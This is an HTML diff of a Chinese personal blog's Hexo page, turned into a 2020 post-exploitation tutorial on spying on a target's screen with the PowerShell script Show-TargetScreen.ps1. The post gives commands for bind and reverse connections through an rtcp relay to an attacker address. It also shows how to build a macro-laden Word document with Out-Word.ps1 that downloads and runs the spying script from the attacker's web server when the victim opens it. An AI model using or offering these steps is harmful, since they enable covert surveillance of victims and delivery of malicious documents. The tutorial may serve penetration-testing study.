@@ -50,18 +50,26 @@
   };
 </script>
 
-  <meta name="description" content="斯是陋室,惟吾德馨">
-<meta property="og:type" content="website">
-<meta property="og:title" content="skyeの博客">
-<meta property="og:url" content="http://forever-sky.github.io/categories/HEXO-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/index.html">
+  <meta name="description" content="Bind模式：出现下面这种情况 1管理员powershell：执行 set-ExecutionPolicy RemoteSigned  12PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Bind -Port 3333  然后在自己">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Powershell ________ 对目标进行屏幕监控">
+<meta property="og:url" content="http://forever-sky.github.io/2020/03/25/Powershell%20________%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/index.html">
 <meta property="og:site_name" content="skyeの博客">
-<meta property="og:description" content="斯是陋室,惟吾德馨">
+<meta property="og:description" content="Bind模式：出现下面这种情况 1管理员powershell：执行 set-ExecutionPolicy RemoteSigned  12PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Bind -Port 3333  然后在自己">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200325191322855.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200325191758673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200325192032100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200325192125861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200325192133185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-03-25T11:22:07.642Z">
+<meta property="article:modified_time" content="2020-03-25T11:22:07.642Z">
 <meta property="article:author" content="skye">
 <meta property="article:tag" content="每天进步一点点">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200325191322855.png">
 
-<link rel="canonical" href="http://forever-sky.github.io/categories/HEXO-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/">
+<link rel="canonical" href="http://forever-sky.github.io/2020/03/25/Powershell%20________%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/">
 
 
 <script id="page-configurations">
@@ -69,11 +77,11 @@
   CONFIG.page = {
     sidebar: "",
     isHome: false,
-    isPost: false
+    isPost: true
   };
 </script>
 
-  <title>分类: HEXO 搭建博客问题 | skyeの博客</title>
+  <title>Powershell ________ 对目标进行屏幕监控 | skyeの博客</title>
   
 
 
@@ -189,54 +197,173 @@
           <div class="content">
             
 
+  <div class="posts-expand">
+      
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">HEXO 搭建博客问题
-          <small>分类</small>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://forever-sky.github.io/2020/03/25/Powershell%20________%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pika.jpg">
+      <meta itemprop="name" content="skye">
+      <meta itemprop="description" content="斯是陋室,惟吾德馨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="skyeの博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          Powershell ________ 对目标进行屏幕监控
         </h2>
-      </div>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-25 19:22:07" itemprop="dateCreated datePublished" datetime="2020-03-25T19:22:07+08:00">2020-03-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F-powershell%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">后渗透-powershell脚本使用</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span id="/2020/03/25/Powershell%20________%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/" class="post-meta-item leancloud_visitors" data-flag-title="Powershell ________ 对目标进行屏幕监控" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/03/25/Powershell%20________%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/03/25/Powershell%20________%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>861</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <h2 class="collection-header">2020</h2>
+        <font face="微软雅黑" size = 5.5 color = red >
+
+<h2 id="Bind模式："><a href="#Bind模式：" class="headerlink" title="Bind模式："></a><strong>Bind模式：</strong></h2><p>出现下面这种情况<br><img src="https://img-blog.csdnimg.cn/20200325191322855.png" alt="在这里插入图片描述"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">管理员powershell：执行 set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Bind -Port <span class="number">3333</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在自己的计算机上使用火狐访问目标3333端口，结果如下图：<br><img src="https://img-blog.csdnimg.cn/20200325191758673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="Reverse模式"><a href="#Reverse模式" class="headerlink" title="Reverse模式"></a><strong>Reverse模式</strong></h2><p><strong>attacker：</strong></p>
+<p>在这里可以使用创宇的py脚本转发：</p>
+<p><a href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a><br><strong>执行:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rtcp [master] python rtcp.py l:<span class="number">5555</span> l:<span class="number">4444</span></span><br><span class="line">监听本地<span class="number">5555</span>端口以及<span class="number">4444</span>端口。</span><br></pre></td></tr></table></figure>
+
+<p>   之后在target执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Reverse-IPAddress <span class="number">192.168</span><span class="number">.74</span><span class="number">.1</span> -Port <span class="number">5555</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200325192032100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="使用Powershell-Client"><a href="#使用Powershell-Client" class="headerlink" title="使用Powershell Client"></a>使用Powershell Client</h2><p>以Out-Word.ps1作为演示示例：</p>
+<p>生成word文件:</p>
+<p>PS C:\Users\evi1cg\Desktop&gt; . .\Out-Word.ps1<br>PS C:\Users\evi1cg\Desktop&gt; Out-Word -PayloadURL”<a href="http://192.168.74.1/Show-TargetScreen.ps1&quot;">http://192.168.74.1/Show-TargetScreen.ps1&quot;</a> -Arguments”Show-TargetScreen -Reverse -IPAddress 192.168.74.1 -Port 6666”<br>之后将Show-TargetScreen.ps1放在我们的web根目录：</p>
+<p>测试：<br><img src="https://img-blog.csdnimg.cn/20200325192125861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>开启监听：</p>
+<p>rtcp [master] python rtcp.py l:6666 l:4444<br>当运行开启office宏的word时，我们就可对其屏幕进行监控，如下图：<br><img src="https://img-blog.csdnimg.cn/20200325192133185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
+        
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-03-25T08:01:14+08:00"
-              content="2020-03-25">
-          03-25
-        </time>
-      </div>
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>skye
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://forever-sky.github.io/2020/03/25/Powershell%20________%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/" title="Powershell ________ 对目标进行屏幕监控">http://forever-sky.github.io/2020/03/25/Powershell ________ 对目标进行屏幕监控/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
 
-      <h3 class="post-title">
-          <a class="post-title-link" href="/2020/03/25/hexo%207.7%20%E7%89%88%E6%9C%AC%20%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%B7%E5%BC%8F%E6%96%87%E4%BB%B6%E5%A4%B1%E6%95%88/" itemprop="url">
-            <span itemprop="name">hexo 7.7 版本 自定义样式文件失效</span>
-          </a>
-      </h3>
 
-    </header>
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/25/metasploit%E5%90%8E%E6%B8%97%E9%80%8F/" rel="prev" title="metasploit后渗透">
+      <i class="fa fa-chevron-left"></i> metasploit后渗透
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
   </article>
+  
+  
+  
 
-    </div>
   </div>
-  
-  
-  
-
-  
-
 
 
           </div>
           
+    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -283,6 +410,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bind模式："><span class="nav-number">1.</span> <span class="nav-text">Bind模式：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse模式"><span class="nav-number">2.</span> <span class="nav-text">Reverse模式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用Powershell-Client"><span class="nav-number">3.</span> <span class="nav-text">使用Powershell Client</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
